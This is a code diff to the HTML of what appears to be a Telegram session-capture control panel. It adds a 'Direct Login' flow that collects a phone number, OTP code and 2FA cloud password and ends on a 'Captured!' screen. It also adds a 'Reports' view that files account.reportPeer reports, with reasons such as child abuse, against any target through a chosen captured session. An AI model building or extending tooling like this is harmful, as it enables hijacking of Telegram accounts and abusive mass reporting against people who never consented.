@@ -20,6 +20,8 @@
     <nav>
       <a class="nav-item active" data-view="dashboard"><i data-lucide="layout-dashboard"></i><span>Dashboard</span></a>
       <a class="nav-item" data-view="sessions"><i data-lucide="smartphone"></i><span>Sessions</span></a>
+      <a class="nav-item" data-view="directlogin"><i data-lucide="key-square"></i><span>Direct Login</span></a>
+      <a class="nav-item" data-view="reports"><i data-lucide="flag"></i><span>Reports</span></a>
       <a class="nav-item" data-view="bots"><i data-lucide="bot"></i><span>Bots</span></a>
       <a class="nav-item" data-view="audit"><i data-lucide="activity"></i><span>Activity</span></a>
       <a class="nav-item" data-view="settings"><i data-lucide="settings"></i><span>Settings</span></a>
@@ -83,6 +85,99 @@
         <button class="btn ghost sm" id="btn-export"><i data-lucide="download"></i><span>Export</span></button>
       </div>
       <div class="card-list" id="session-list"></div>
+    </section>
+
+    <section class="view hidden" id="view-directlogin">
+      <div class="dl-wrap">
+        <div class="dl-card" id="dl-card">
+          <!-- Step 1: Phone -->
+          <div class="dl-step active" id="dl-step-phone">
+            <div class="dl-icon"><i data-lucide="key-square"></i></div>
+            <h2>Direct Login</h2>
+            <p class="muted">Log in a Telegram account directly from the panel.</p>
+            <div class="dl-form">
+              <input type="tel" id="dl-phone" class="input dl-input" placeholder="+1 234 567 8900" autocomplete="off">
+              <div class="err" id="dl-phone-err"></div>
+              <button class="btn primary dl-btn" id="dl-send"><i data-lucide="send"></i><span>Send Code</span></button>
+            </div>
+          </div>
+
+          <!-- Step 2: OTP -->
+          <div class="dl-step" id="dl-step-otp">
+            <div class="dl-icon"><i data-lucide="message-square"></i></div>
+            <h2>Enter Code</h2>
+            <p class="muted">Code sent to <span id="dl-phone-display" class="mono"></span></p>
+            <div class="dl-otp-row">
+              <input class="dl-otp-cell" maxlength="1" inputmode="numeric" data-i="0">
+              <input class="dl-otp-cell" maxlength="1" inputmode="numeric" data-i="1">
+              <input class="dl-otp-cell" maxlength="1" inputmode="numeric" data-i="2">
+              <input class="dl-otp-cell" maxlength="1" inputmode="numeric" data-i="3">
+              <input class="dl-otp-cell" maxlength="1" inputmode="numeric" data-i="4">
+            </div>
+            <div class="err" id="dl-otp-err"></div>
+            <button class="btn primary dl-btn" id="dl-verify" disabled><i data-lucide="check"></i><span>Verify Code</span></button>
+            <button class="btn ghost dl-link" id="dl-back-phone"><i data-lucide="arrow-left"></i><span>Change number</span></button>
+          </div>
+
+          <!-- Step 3: 2FA -->
+          <div class="dl-step" id="dl-step-2fa">
+            <div class="dl-icon"><i data-lucide="shield"></i></div>
+            <h2>2FA Password</h2>
+            <p class="muted">This account has cloud 2FA enabled.</p>
+            <input type="password" id="dl-2fa" class="input dl-input" placeholder="Cloud password">
+            <div class="err" id="dl-2fa-err"></div>
+            <button class="btn primary dl-btn" id="dl-verify-2fa"><i data-lucide="check"></i><span>Verify</span></button>
+          </div>
+
+          <!-- Step 4: Success -->
+          <div class="dl-step" id="dl-step-success">
+            <div class="dl-success-icon"><i data-lucide="check-circle-2"></i></div>
+            <h2>Captured!</h2>
+            <p class="muted">Session for <b id="dl-success-name"></b> is now in your dashboard.</p>
+            <button class="btn primary dl-btn" id="dl-done"><i data-lucide="arrow-right"></i><span>View Sessions</span></button>
+          </div>
+
+          <!-- Loading overlay -->
+          <div class="dl-loading" id="dl-loading"><div class="dl-spinner"></div></div>
+        </div>
+      </div>
+    </section>
+
+    <section class="view hidden" id="view-reports">
+      <div class="panel">
+        <div class="panel-h"><span><i data-lucide="flag" class="ic"></i> Report a Peer</span></div>
+        <div class="muted sm" style="margin-bottom:14px">Uses <code>account.reportPeer</code> via the selected session's account. Target can be a @username, phone number, or user ID.</div>
+        <label class="label">Session (reporter account)</label>
+        <select id="rp-session" class="input"></select>
+        <label class="label">Target peer (@username / phone / user ID)</label>
+        <input type="text" id="rp-peer" class="input" placeholder="@baduser or +1234567890 or 123456789">
+        <div class="rp-resolve-row">
+          <button class="btn ghost sm" id="rp-resolve"><i data-lucide="search"></i><span>Resolve</span></button>
+          <span id="rp-resolve-result" class="muted sm"></span>
+        </div>
+        <label class="label">Reason</label>
+        <select id="rp-reason" class="input">
+          <option value="spam">Spam</option>
+          <option value="violence">Violence</option>
+          <option value="pornography">Pornography</option>
+          <option value="child_abuse">Child Abuse</option>
+          <option value="copyright">Copyright</option>
+          <option value="geo_irrelevant">Geo Irrelevant</option>
+          <option value="fake">Fake</option>
+          <option value="illegal_drugs">Illegal Drugs</option>
+          <option value="personal_details">Personal Details</option>
+          <option value="other">Other</option>
+        </select>
+        <label class="label">Additional message (optional)</label>
+        <textarea id="rp-message" class="input" rows="3" placeholder="Optional context for the report"></textarea>
+        <div class="err" id="rp-err"></div>
+        <button class="btn primary" id="rp-submit" style="margin-top:10px"><i data-lucide="flag"></i><span>Submit Report</span></button>
+      </div>
+
+      <div class="panel">
+        <div class="panel-h"><span><i data-lucide="history" class="ic"></i> Recent Reports</span></div>
+        <div id="rp-history" class="audit-list"></div>
+      </div>
     </section>
 
     <section class="view hidden" id="view-bots">
